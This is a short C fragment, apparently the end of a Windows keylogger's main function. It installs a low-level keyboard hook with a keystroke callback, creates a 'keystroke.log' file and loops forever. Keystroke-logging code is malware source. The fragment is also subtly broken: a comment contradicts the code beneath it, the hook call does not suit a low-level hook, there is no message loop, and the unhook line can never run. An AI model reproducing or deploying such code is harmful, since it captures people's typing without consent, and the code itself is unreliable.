    // Check if hook exists and remove it
    hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyStrokeCallback);

    // Create the log file
    FILE *file = fopen("keystroke.log", "w");
    if (file) {
        fprintf(file, "Keystroke Log\n");
        fclose(file);
    }

    // Loop to handle keystrokes
    while (true) {
        Sleep(1);
    }

    // Remove the hook
    UnhookWindowsHook(hKeyboardHook);

    return 0;
}
```

